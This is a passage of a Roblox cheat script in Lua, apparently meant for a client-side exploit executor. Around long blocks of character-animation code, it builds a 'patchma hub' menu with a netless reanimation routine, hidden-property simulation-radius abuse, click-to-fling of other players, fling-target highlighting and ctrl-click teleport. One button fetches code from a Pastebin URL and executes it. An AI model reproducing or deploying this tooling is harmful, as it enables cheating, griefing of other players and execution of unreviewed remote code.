RightShoulder.C0=RightShoulder.C0:Lerp(cf(0.5,-0.2+0.125*sin((sine + 1.25)*-8.5),-0.75)*angles(1.5707963267948966,2.0943951023931953,1.3962634015954636+0.08726646259971647*sin((sine+0.25)*-8.5)),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-0.75+0.75*sin((sine - 0.75)*8.5),-0.3+0.75*sin((sine - 0.5)*8.5))*angles(-0.17453292519943295+1.0471975511965976*sin((sine+0.5)*8.5),1.5707963267948966,0),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-0.75+0.75*sin((sine - 0.75)*8.5),-0.3+0.75*sin((sine - 0.5)*8.5))*angles(-0.17453292519943295+1.0471975511965976*sin((sine+0.5)*8.5),-1.5707963267948966,0),deltaTime) 
		end
	})
	addmode("q", {
		idle = function()
RightHip.C0=RightHip.C0:Lerp(cf(1,-0.5+0.6*sin(sine*-8),-0.5)*angles(-1.5707963267948966+0.08726646259971647*sin(sine*-8),1.5707963267948966+0.17453292519943295*sin(sine*-4),1.5707963267948966),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,-0.5+0.6*sin(sine*8),0.6 * sin((sine+0.2)*8))*angles(-1.5707963267948966+0.2617993877991494*sin((sine+0.2)*8),0.17453292519943295*sin(sine*4),3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,-0.25)*angles(0,-1.5707963267948966,0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0.2617993877991494*sin((sine-0.5)*4),3.141592653589793),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-0.5+0.6*sin(sine*-8),-0.5)*angles(1.5707963267948966+0.08726646259971647*sin(sine*-8),-1.5707963267948966+0.17453292519943295*sin(sine*4),1.5707963267948966),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(0,1.5707963267948966,0),deltaTime)
		end
	})
end)
btn("Tired", function()
	local t=reanimate()
	if type(t)~="table" then return end
	local addmode=t.addmode
	local getJoint=t.getJoint
	local velbycfrvec=t.velbycfrvec
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")
	t.setWalkSpeed(16)
    t.setJumpPower(0)

	addmode("default",{
		idle=function()
RightHip.C0=RightHip.C0:Lerp(cf(1,-0.9+0.1*sin((sine - 0.4)*-1.5),-0.5+0.075*sin((sine - 1.25)*1.5))*angles(-0.17453292519943295+0.08726646259971647*sin(sine*-1.5),0.8726646259971648,0.3490658503988659),deltaTime)
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.35,-0.25+0.15*sin((sine + 0.5)*1.5))*angles(0.3490658503988659+0.3490658503988659*sin((sine-0.5)*-1.5),1.5707963267948966+0.3490658503988659*sin(sine*-1.5),0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-2.181661564992912+0.08726646259971647*sin((sine-0.75)*1.5),0,3.141592653589793),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,-0.225+0.075*sin((sine - 0.25)*1.5),0.125 * sin((sine+0.5)*1.5))*angles(-1.9198621771937625+0.08726646259971647*sin(sine*1.5),0,3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.35,-0.25+0.15*sin((sine + 0.5)*1.5))*angles(0.3490658503988659+0.3490658503988659*sin((sine-0.5)*-1.5),-1.5707963267948966+0.3490658503988659*sin(sine*1.5),0),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1+0.075*sin((sine - 0.5)*-1.5),-0.25+0.075*sin((sine - 1.25)*1.5))*angles(0.08726646259971647*sin(sine*-1.5),-1.0471975511965976,-0.3490658503988659),deltaTime) 
		end,
		walk=function()
			local fw,rt=velbycfrvec()

LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,-0.25)*angles(0.5235987755982988+0.08726646259971647*sin((sine-1)*8),-1.5707963267948966,0),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1+0.5*sin((sine + 0.4)*8),-0.25+0.5*sin((sine - 0.125)*8))*angles(1.1344640137963142*sin((sine+0.25)*8),-1.5707963267948966,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0.075 * sin(sine*8),0.1 * sin((sine+0.5)*8))*angles(-2.0943951023931953+0.04363323129985824*sin((sine-0.5)*8),0,3.141592653589793),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-2.2689280275926285,0,3.141592653589793),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1+0.5*sin((sine + 0.4)*-8),-0.25+0.5*sin((sine - 0.1)*-8))*angles(1.1344640137963142*sin((sine+0.25)*-8),1.5707963267948966,0),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,-0.25)*angles(0.5235987755982988+0.08726646259971647*sin((sine+1)*-8),1.5707963267948966,0),deltaTime) 
		end
	})
	addmode("f", {
		idle = function()
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-0.7,-0.8)*angles(-0.6981317007977318,-1.5707963267948966,0),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(0.75,1,0.5)*angles(-1.7453292519943295,0.6981317007977318,-1.3962634015954636),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,-2.25,0)*angles(-0.17453292519943295,0,3.141592653589793),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-2.0943951023931953,0,3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-0.75,1,0.5)*angles(-1.7453292519943295,-0.6981317007977318,1.3962634015954636),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,-0.25)*angles(-1.5707963267948966,1.2217304763960306,1.2217304763960306),deltaTime) 
		end
	})
end)
btn("Chill", function()
	local t=reanimate()
	if type(t)~="table" then return end
	local addmode=t.addmode
	local getJoint=t.getJoint
	local velbycfrvec=t.velbycfrvec
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")
	t.setWalkSpeed(10)
	t.setJumpPower(0)
	addmode("default",{
		idle=function()
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5+0.1*sin(sine*1),0)*angles(-0.6981317007977318+0.17453292519943295*sin((sine+10)*1.4),1.2217304763960306,0.6981317007977318),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.3962634015954636+0.17453292519943295*sin((sine+10)*1),0,3.141592653589793),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1.1+0.1*sin((sine + 7)*2),0)*angles(-0.5235987755982988+0.17453292519943295*sin((sine+6)*1),1.5707963267948966,0),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1.1-0.1*sin((sine + 10)*2),0)*angles(-0.3490658503988659+0.3490658503988659*sin((sine+10)*1),-1.5707963267948966,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,5+0.8*sin(sine*1),0)*angles(0.08726646259971647*sin(sine*1.5),0,3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(-0.6981317007977318+0.17453292519943295*sin((sine+5)*1.4),-1.2217304763960306,-0.6981317007977318),deltaTime) 
		end,
		walk=function()
			local fw,rt=velbycfrvec()

            t.setWalkSpeed(10)
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(-0.6981317007977318+0.17453292519943295*sin(sine*1),1.2217304763960306,0.6981317007977318+0.5235987755982988*sin(sine*1)),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1.5,0.5,-0.5)*angles(0.17453292519943295*sin((sine+15)*0.7),0.2617993877991494*sin((sine+15)*2),-1.5707963267948966),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(-0.6981317007977318+0.17453292519943295*sin(sine*1),-1.2217304763960306,-0.6981317007977318+0.5235987755982988*sin(sine*1)),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0.2 * sin(sine*0.7),7+0.5*sin((sine + 10)*1),0)*angles(0.17453292519943295*sin((sine+10)*0.7),-3.141592653589793+0.17453292519943295*sin((sine+5)*0.9),6.283185307179586*sin(sine*0.7)),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1.5,0.5,-0.5)*angles(-0.17453292519943295*sin(sine*0.7),0.2617993877991494*sin((sine+15)*2),1.5707963267948966),deltaTime) 
		end,
        		jump = function()
			local fw, rt = velbycfrvec()

RightShoulder.C0=RightShoulder.C0:Lerp(cf(0.5,0.5,0.5)*angles(0,0,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0,0)*angles(-1.0471975511965976,0,3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-0.5,0.5,0.5)*angles(0,0,0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,-0.5,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(0.17453292519943295-0.17453292519943295*sin(sine*20),-1.5707963267948966,0),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(0.17453292519943295+0.17453292519943295*sin(sine*20),1.5707963267948966,0),deltaTime) 
		end,
		fall = function()
			local fw, rt = velbycfrvec()
RightShoulder.C0=RightShoulder.C0:Lerp(cf(0.5,0.5,0.5)*angles(0,0,0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,-0.5,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-0.5,0.5,0.5)*angles(0,0,0),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(0.17453292519943295*sin(sine*20),-1.5707963267948966,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0,0)*angles(-2.0943951023931953,0,3.141592653589793),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(-0.17453292519943295*sin(sine*20),1.5707963267948966,0),deltaTime) 
		end
	})
end)
btn("stop current script",function()
	stopreanimate()
end).TextColor3=c3(0.75,0,0)

lbl("Re-animation Settings")
lbl("--------------------------------")

local function swtc(txt,options,onchanged)
	local current=0
	local swtcbtn=nil
	local function btnpressed()
		current=current+1
		if current>#options then
			current=1
		end
		local option=options[current]
		swtcbtn.Text=txt..": "..option.text
		onchanged(option.value)
	end
	swtcbtn=btn("change",btnpressed)
	btnpressed()
	return swtcbtn
end

swtc("client sided placeholders",{
	{value=true,text="yes"},
	{value=false,text="no"}
},function(v)
	placeholders=v
end)

swtc("highlight fling targets",{
	{value=true,text="yes"},
	{value=false,text="no"}
},function(v)
	highlightflingtargets=v
end)

swtc("allow shiftlock",{
	{value=true,text="yes"},
	{value=false,text="no"}
},function(v)
	allowshiftlock=v
end)

swtc("ctrl click tp",{
	{value=true,text="yes"},
	{value=false,text="no"}
},function(v)
	ctrltp=v
end)

swtc("click fling",{
	{value=true,text="yes"},
	{value=false,text="no"}
},function(v)
	clickfling=v
end)

if type(shp)=="function" then
	swtc("simulation radius",{
		{value=1000,text="on"},
		{value=false,text="off"}
	},function(v)
		simrad=v
	end)
else
	lbl("simulation radius: unavailable")
end

local iscg,_=pcall(function()
	i9.Parent=cg
end)
if not iscg then
	local t=i6.Text
	i6.Text="PLAYERGUI MODE"
	i9.Parent=pg
	twait(3)
	i6.Text=t
end
end)

tab:Button("Rcd disabled krystal dance reanim", function()
loadstring(game:HttpGet("https://pastebin.com/raw/LR02HeKS"))()
end)

tab:Button("Patchma hub", function()
--[[
	patchma hub by MyWorld
	one last unpatch... 

    IDs of accessories for limbs:
	12652786974,11159483910,11263254795,11159410305
    
    FOR TORSO USE ANY ACCESSORY THAT COVERS IT
    (customization :smirk:)
    
    examples of accessories for torso:
    13423624885,11502853991,14053485259,13779879140
    or use the same stuff but different colors
]]

--findfirstchildofclass faster than getservice
local plrs=game:FindFirstChildOfClass("Players")
local rs=game:FindFirstChildOfClass("RunService")
local ws=game:FindFirstChildOfClass("Workspace")
local uis=game:FindFirstChildOfClass("UserInputService")
local gs=game:FindFirstChildOfClass("GuiService")
local cg=game:FindFirstChildOfClass("CoreGui")

local lp=plrs.LocalPlayer
local pg=lp:FindFirstChildOfClass("PlayerGui")
local mouse=lp:GetMouse()
local stepped=rs.Stepped
local heartbeat=rs.Heartbeat
local renderstepped=rs.RenderStepped

local osclock=os.clock
local tspawn=task.spawn
local twait=task.wait
local schar=string.char
local sbyte=string.byte
local ssub=string.sub
local sfind=string.find
local supper=string.upper
local mrandom=math.random
local clamp=math.clamp
local sin=math.sin
local cos=math.cos
local abs=math.abs
local rad=math.rad
local tinsert=table.insert
local tclear=table.clear
local tclone=table.clone
local tfind=table.find
local tunpack=table.unpack

local i=Instance.new 
local v2=Vector2.new 
local v3=Vector3.new
local c3=Color3.new 
local cf=CFrame.new
local angles=CFrame.Angles
local u2=UDim2.new
local e=Enum 
local cs=ColorSequence.new 
local csk=ColorSequenceKeypoint.new 

local sine=osclock()
local deltaTime=0
local v3_0=v3(0,0,0)
local v3_101=v3(1,0,1)
local v3_010=v3(0,1,0)
local v3_001=v3(0,0,1)
local cf_0=cf(0,0,0)
local v3_xz=v3_101*10
local v3_net=v3_010*25.01

local function makepcall(f)
	if type(f)=="function" then
		return function(...)
			local a={...}
			local r=nil
			pcall(function()
				r={f(tunpack(a))}
			end)
			return tunpack(r or {})
		end
	end
	return function() end
end
local function rs(l) 
	l=l or mrandom(8,15) 
	local s="" 
	for i=1,l do 
		if mrandom(1,2)==1 then 
			s=s..schar(mrandom(65,90)) 
		else 
			s=s..schar(mrandom(97,122)) 
		end 
	end 
	return s 
end 
local function dfind(t,v)
	for i,v1 in pairs(t) do
		if v1==v then
			return i
		end
	end
	return nil
end
local function gp(p,n,cl)
	if typeof(p)=="Instance" then
		local c=p:GetChildren()
		for i=1,#c do
			local v=c[i]
			if (v.Name==n) and v:IsA(cl) then
				return v
			end
		end
	end
	return nil
end
local function loopgp(...)
	while true do
		local r=gp(...)
		if r then
			return r
		end
		twait()
	end
end
local function timegp(p,n,c,t)
	t=osclock()+t
	while t>osclock() do
		local r=gp(p,n,c)
		if r then
			return r
		end
		twait()
	end
	return nil
end
local function getNetlessVelocity(realVel)
	--if true then return v3_0 end
	--if true then return realPartVelocity end
	--if true then return v3_net end
	if realVel.Magnitude>25.01 then
		realVel=realVel.Unit*25.01
	end
	return realVel*v3_xz+v3_net
end
local isClientInstance=makepcall(function(i)
	return ssub(i:GetDebugId(),1,1)=="0"
end)
local isServerInstance=function(i)
	return not isClientInstance(i)
end
local shp=(((type(getfenv)=="function") and getfenv()) or {}).sethiddenproperty

local i1=i("Frame") 
local i2=i("Frame") 
local i3=i("ScrollingFrame") 
local i4=i("UIListLayout") 
local i5=i("UIGradient") 
local i6=i("TextLabel") 
local i7=i("TextButton") 
local i8=i("UIGradient") 
local i9=i("ScreenGui") 
i1.AnchorPoint=v2(0.5,0) 
i1.BackgroundColor3=c3(1,1,1) 
i1.BorderSizePixel=0 
i1.Position=u2(0.5,0,0.5,-150) 
i1.Size=u2(0,200,0,305)
i1.Name=rs() 
i1.Parent=i9 
i2.BackgroundColor3=c3(1,1,1) 
i2.BorderSizePixel=0 
i2.Position=u2(0,5,0,20) 
i2.Size=u2(1,-10,1,-25) 
i2.Name=rs() 
i2.Parent=i1 
i3.Active=true 
i3.BackgroundTransparency=1 
i3.BorderSizePixel=0 
i3.Size=u2(1,-3,1,0) 
i3.AutomaticCanvasSize=e.AutomaticSize.Y 
i3.CanvasSize=u2(0,0,0,0) 
i3.ScrollBarThickness=7 
i3.Name=rs() 
i3.Parent=i2 
i4.Name=rs() 
i4.Parent=i3 
i4.SortOrder=e.SortOrder.LayoutOrder 
i5.Name=rs() 
i5.Parent=i2 
i5.Color=cs({[1]=csk(0,c3(0.121569,0.121569,0.121569)),[2]=csk(1,c3(0.0705882,0.0705882,0.0705882))}) 
i5.Rotation=90 
i6.Font=e.Font.SourceSans 
i6.FontSize=e.FontSize.Size18 
i6.Text="patchma hub" 
i6.TextColor3=c3(0,0,1) 
i6.TextSize=16 
i6.BackgroundTransparency=1 
i6.BorderSizePixel=0 
i6.Position=u2(0,1,0,1) 
i6.Size=u2(1,-2,0,20) 
i6.Name=rs() 
i6.Parent=i1 
i7.AnchorPoint=v2(1,0) 
i7.BackgroundTransparency=1 
i7.Position=u2(1,0,0,0) 
i7.Size=u2(0,40,1,0) 
i7.Name=rs() 
i7.Parent=i6 
i7.Font=e.Font.SourceSans 
i7.FontSize=e.FontSize.Size18 
i7.Text="-" 
i7.TextColor3=c3(1,1,1) 
i7.TextSize=16 
i8.Name=rs() 
i8.Parent=i1 
i8.Color=cs({[1]=csk(0,c3(0,0,0)),[2]=csk(1,c3(0,0,0.584314))}) 
i8.Rotation=90 
i9.ZIndexBehavior=e.ZIndexBehavior.Sibling 
i9.IgnoreGuiInset=true 
i9.ResetOnSpawn=false 
i9.Name=rs() 
local min=false
i7.MouseButton1Click:Connect(function()
	min = not min
	if min then
		i2.Visible=false 
		i8.Color=cs({[1]=csk(0,c3(0,0,0)),[2]=csk(1,c3(0,0,0))}) 
		i1.Size=u2(0,200,0,22) 
	else
		i1.Size=u2(0,200,0,305) 
		i8.Color=cs({[1]=csk(0,c3(0,0,0)),[2]=csk(1,c3(0,0,0.584314))}) 
		i2.Visible=true 
	end
end)
local function Draggable(window,obj)
	local MB1enum = e.UserInputType.MouseButton1
	local TOUCHenum = e.UserInputType.Touch
	obj = obj or window
	local activeEntered = 0
	local mouseStart = nil
	local dragStart = nil
	local inputbegancon = nil
	local rendersteppedcon = nil
	local inputendedcon = nil
	local function inputendedf(a)
		a=a.UserInputType
		if (a==MB1enum) or (a==TOUCHenum) then
			rendersteppedcon:Disconnect()
			inputendedcon:Disconnect()
		end
	end
	local function rendersteppedf()
		local off = uis:GetMouseLocation()-mouseStart
		window.Position=dragStart+u2(0,off.X,0,off.Y)
	end
	local function inputbeganf(a)
		a=a.UserInputType
		if ((a==MB1enum) or (a==TOUCHenum)) and (activeEntered==0) and not uis:GetFocusedTextBox() then
			mouseStart=uis:GetMouseLocation()
			dragStart=window.Position
			if rendersteppedcon then rendersteppedcon:Disconnect() end
			rendersteppedcon = renderstepped:Connect(rendersteppedf)
			if inputendedcon then inputendedcon:Disconnect() end
			inputendedcon = uis.InputEnded:Connect(inputendedf)
		end
	end
	obj.MouseEnter:Connect(function()
		if inputbegancon then inputbegancon:Disconnect() end
		inputbegancon = uis.InputBegan:Connect(inputbeganf)
	end)
	obj.MouseLeave:Connect(function()
		inputbegancon:Disconnect()
	end)
	local function ondes(d)
		if d:IsA("GuiObject") then
			local thisEntered = false
			local thisAdded = false
			local con0 = d.MouseEnter:Connect(function()
				thisEntered = true
				if (not thisAdded) and d.Active then
					activeEntered = activeEntered + 1
					thisAdded = true
				end
			end)
			local con1 = d.MouseLeave:Connect(function()
				thisEntered = false
				if thisAdded then
					activeEntered = activeEntered - 1
					thisAdded = false
				end
			end)
			local con2 = d:GetPropertyChangedSignal("Active"):Connect(function()
				if thisEntered then
					if thisAdded and not d.Active then
						activeEntered = activeEntered - 1
						thisAdded = false
					elseif d.Active and not thisAdded then
						activeEntered = activeEntered + 1
						thisAdded = true
					end
				end
			end)
			local con3 = nil
			con3 = d.AncestryChanged:Connect(function()
				if not d:IsDescendantOf(window) then
					if thisEntered then
						activeEntered = activeEntered - 1
					end
					con0:Disconnect()
					con1:Disconnect()
					con2:Disconnect()
					con3:Disconnect()
				end
			end)
		end
	end
	window.DescendantAdded:Connect(ondes)
	local des=window:GetDescendants()
	for i=1,#des do 
		ondes(des[i])
	end
end
local function btn(txt, f)
	local i1=i("TextButton") 
	i1.AutomaticSize=e.AutomaticSize.Y 
	i1.BackgroundTransparency=1 
	i1.Size=u2(1,0,0,0) 
	i1.Name=rs() 
	i1.Font=e.Font.SourceSans 
	i1.FontSize=e.FontSize.Size14 
	i1.Text=txt 
	i1.TextColor3=c3(0.0941177,0.317647,0.878431) 
	if f then 
		i1.MouseButton1Click:Connect(f) 
	end 
	i1.Parent=i3 
	return i1
end
local function lbl(txt)
	local i1=i("TextLabel") 
	i1.Font=e.Font.SourceSans 
	i1.FontSize=e.FontSize.Size14 
	i1.Text=txt 
	i1.TextColor3=c3(0.560784,0.560784,0.560784) 
	i1.AutomaticSize=e.AutomaticSize.Y 
	i1.BackgroundTransparency=1 
	i1.Size=u2(1,0,0,0) 
	i1.Name=rs() 
	i1.Parent=i3 
	return i1
end

Draggable(i1)

lbl("by MyWorld")
lbl("low effort ui obviously")

local allowshiftlock=nil
local ctrltp=nil
local simrad=nil
local placeholders=nil
local clickfling=nil
local highlightflingtargets=nil

local stopreanimate=function() return nil end
local function reanimate()
	--[[
	    FDless reanimate by MyWorld
	    aka no client sided instances
	    "what else do i optimize here"
	]]

	local novoid = true --prevents parts from going under workspace.FallenPartsDestroyHeight if you control them
	local placeholders = placeholders --makes client sided accessories replacing the real ones when unavailable
	local speedlimit = 3000 --makes your parts move slower if the magnitude of their velocity is higher than this
	local antiragdoll = true --removes instances that are usually used for ragdolling form your character
	local R15toR6 = true --adds fake r6 parts and joints for animations if your character is r15
	local walkSpeed = 16 --your walkspeed (can be changed at runtime)
	local jumpPower = 50 --your jump power (can be changed at runtime)
	local allowshiftlock = allowshiftlock --allows the user to use shiftlock (can be changed at runtime)
	local gravity = 196.2 --how fast the characters velocity decreases while falling (can be changed at runtime)
	local simrad = simrad --sets simulation radius to this with sethiddenproperty if its set to a number
	local ctrlclicktp = ctrltp --makes you teleport where u point ur mouse cursor at when click and hold ctrl down
	local clickfling = clickfling --makes you fling the person you clicked when its available to do so
	local flingvel = v3(15000,15000,15000) --the rotation velocity that ur character will have while flinging
	local highlightflingtargets = highlightflingtargets --highlights characters that are going to get flung

	local c=lp.Character
	if stopreanimate() or not (c and c:IsDescendantOf(ws)) then return end
	
	local hum=c:FindFirstChildOfClass("Humanoid")
	local rootpart=gp(c,"HumanoidRootPart","BasePart") or gp(c,"Torso","BasePart") or gp(c,"UpperTorso","BasePart") or (hum and hum.RootPart) or timegp(c,"HumanoidRootPart","BasePart",0.5) or c:FindFirstChildWhichIsA("BasePart")
	if not rootpart then return end

	R15toR6=R15toR6 and hum and (hum.RigType==e.HumanoidRigType.R15)
	simrad = (type(simrad)=="number") and (type(shp)=="function") and simrad

	local cam=nil
	--theres a way to have ws.currentcamera nil on heartbeat and still have the game run normally
	local function refcam()
		cam=ws.CurrentCamera
		while not cam do
			ws:GetPropertyChangedSignal("CurrentCamera"):Wait()
			cam=ws.CurrentCamera
		end
	end
	refcam()
	local camcf=cam.CFrame
	local enumCamS=e.CameraType.Scriptable
	local camt=cam.CameraType
	local camcon0=nil
	local camcon1=nil
	local function onnewcamera()
		refcam()
		if camcon0 then 
			camcon0:Disconnect()
			camcon0=nil
		end
		if not c then 
			if cam.CameraType==enumCamS then
				cam.CameraType=camt
			end
			return camcon1:Disconnect() 
		end
		camcon0=cam.Changed:Connect(function(p)
			if not c then
				camcon0:Disconnect()
				return camcon1:Disconnect()
			end
			if (p=="CFrame") and (cam.CFrame~=camcf) then
				cam.CFrame=camcf
			elseif (p=="CameraSubject") or (p=="CameraType") then
				local subj=cam.CameraSubject
				if subj and subj:IsA("Humanoid") and (subj.Parent==c) and (cam.CameraType~=enumCamS) then
					cam.CameraType = enumCamS
				end
			end
		end)
		local subj=cam.CameraSubject
		if subj and subj:IsA("Humanoid") and (subj.Parent==c) and (cam.CameraType~=enumCamS) then
			cam.CameraType=enumCamS
		end
		cam.CFrame=camcf
	end
	camcon1=ws:GetPropertyChangedSignal("CurrentCamera"):Connect(onnewcamera)
	onnewcamera()

	local fpdh=ws.FallenPartsDestroyHeight
	novoid=novoid and (fpdh+1)
	
	local function getMeshOfPart(v)
		if typeof(v)=="Instance" then
			if v:IsA("MeshPart") then
				return v.MeshId, v.TextureID
			else
				v=v:FindFirstChildOfClass("SpecialMesh")
				if v then
					return v.MeshId, v.TextureId
				end
			end
		end
		return nil, nil
	end
	
	local joints={}
	local cframes={}
	local des=c:GetDescendants()
	for i=1,#des do
		local v=des[i]
		if v:IsA("JointInstance") then
			tinsert(joints,{
				Name=v.Name,
				C0=v.C0,
				C1=v.C1,
				Part0=v.Part0,
				Part1=v.Part1
			})
		elseif v:IsA("BasePart") then
			cframes[v]=v.CFrame
		end
	end
	
	local function makeplaceholder(v)
		if typeof(v)~="Instance" then
			return nil
		end
		if not v.Archivable then
			v.Archivable=true
		end
		v=v:Clone()
		local c=v:GetChildren()
		for i=1,#c do
			local v=c[i]
			if v:IsA("SpecialMesh") then
				v.Name=rs()
				v:ClearAllChildren()
			else
				v:Destroy()
			end
		end
		v.Name=rs()
		v.Anchored=true
		v.CanCollide=false
		v.Transparency=0.25
		v.Parent=ws
		return v
	end
	
	local function filterInstance(v)
		local ins=v
		if isClientInstance(v) then
			v={CFrame=v.CFrame,Name=v.Name,Anchored=true}
		else
			local meshid,textureid=getMeshOfPart(v)
			if meshid and (meshid~="") and textureid and (textureid~="") then
				if placeholders then
					v={CFrame=v.CFrame,Name=v.Name,Anchored=true,meshid=meshid,textureid=textureid,placeholder=makeplaceholder(v)}
				else
					v={CFrame=v.CFrame,Name=v.Name,Anchored=true,meshid=meshid,textureid=textureid}
				end
			else
				v={CFrame=v.CFrame,Name=v.Name,Anchored=true}
			end
		end
		for i,v1 in pairs(tclone(cframes)) do
			if i==ins then
				cframes[ins]=nil
				cframes[v]=v1
			end
		end
		for i,v1 in pairs(joints) do
			if v1.Part0==ins then
				v1.Part0=v
			elseif v1.Part1==ins then
				v1.Part1=v
			end
		end
		if rootpart==ins then
			rootpart=v
		end
		return v
	end
	for i,v in pairs(joints) do
		v.Part0=filterInstance(v.Part0)
		v.Part1=filterInstance(v.Part1)
	end
	
	local Yvel=0
	local cfr=rootpart.CFrame
	local pos=cfr.Position
	local shiftlock=false
	local firstperson=false
	local xzvel=v3_0
	local v3_0150=v3_010*1.5
	local camoff=cf(v3_0,camcf.LookVector)
	camoff=camoff-v3_001*(camcf.Position-(pos+v3_0150)).Magnitude

	local refreshjointsinternal=nil
	refreshjointsinternal=function(part,refreshed)
		if not part then return end
		tinsert(refreshed,part)
		for i,v in pairs(joints) do
			local part0=v.Part0
			local part1=v.Part1
			if part1 and (part0==part) then
				cframes[part1]=cframes[part]*v.C0*v.C1:Inverse()
				if not tfind(refreshed,part1) then
					refreshjointsinternal(part1,refreshed)
				end
			elseif part0 and (part1==part) then
				cframes[part0]=cframes[part]*v.C1*v.C0:Inverse()
				if not tfind(refreshed,part0) then
					refreshjointsinternal(part0,refreshed)
				end
			end
		end
	end
	local function refreshjoints(v)
		refreshjointsinternal(v,{})
	end

	if R15toR6 then
		local R6parts={ 
			head={Name="Head",Anchored=true},
			torso={Name="Torso",Anchored=true},
			root={Name="HumanoidRootPart",Anchored=true},
			leftArm={Name="Left Arm",Anchored=true},
			rightArm={Name="Right Arm",Anchored=true},
			leftLeg={Name="Left Leg",Anchored=true},
			rightLeg={Name="Right Leg",Anchored=true}
		}
		for i,v in pairs(R6parts) do
			cframes[v]=cfr
		end
		tinsert(joints,{
			Name="Neck",
			Part0=R6parts.torso,Part1=R6parts.head,
			C0=cf(0,1,0,-1,0,0,0,0,1,0,1,-0),
			C1=cf(0,-0.5,0,-1,0,0,0,0,1,0,1,-0)
		})
		tinsert(joints,{
			Name="RootJoint",
			Part0=R6parts.root,Part1=R6parts.torso,
			C0=cf(0,0,0,-1,0,0,0,0,1,0,1,-0),
			C1=cf(0,0,0,-1,0,0,0,0,1,0,1,-0)
		})
		tinsert(joints,{
			Name="Right Shoulder",
			Part0=R6parts.torso,Part1=R6parts.rightArm,
			C0=cf(1,0.5,0,0,0,1,0,1,-0,-1,0,0),
			C1=cf(-0.5,0.5,0,0,0,1,0,1,-0,-1,0,0)
		})
		tinsert(joints,{
			Name="Left Shoulder",
			Part0=R6parts.torso,Part1=R6parts.leftArm,
			C0=cf(-1,0.5,0,0,0,-1,0,1,0,1,0,0),
			C1=cf(0.5,0.5,0,0,0,-1,0,1,0,1,0,0)
		})
		tinsert(joints,{
			Name="Right Hip",
			Part0=R6parts.torso,Part1=R6parts.rightLeg,
			C0=cf(1,-1,0,0,0,1,0,1,-0,-1,0,0),
			C1=cf(0.5,1,0,0,0,1,0,1,-0,-1,0,0)
		})
		tinsert(joints,{
			Name="Left Hip" ,
			Part0=R6parts.torso,Part1=R6parts.leftLeg,
			C0=cf(-1,-1,0,0,0,-1,0,1,0,1,0,0),
			C1=cf(-0.5,1,0,0,0,-1,0,1,0,1,0,0)
		})
		tinsert(joints,{
			Part0=R6parts.root,Part1=rootpart,
			C0=cf_0,C1=cf_0
		})
		refreshjoints(rootpart)
		local function getpart(n)
			for i,_ in pairs(cframes) do
				if (i.Name==n) and not dfind(R6parts,i) then
					return i
				end
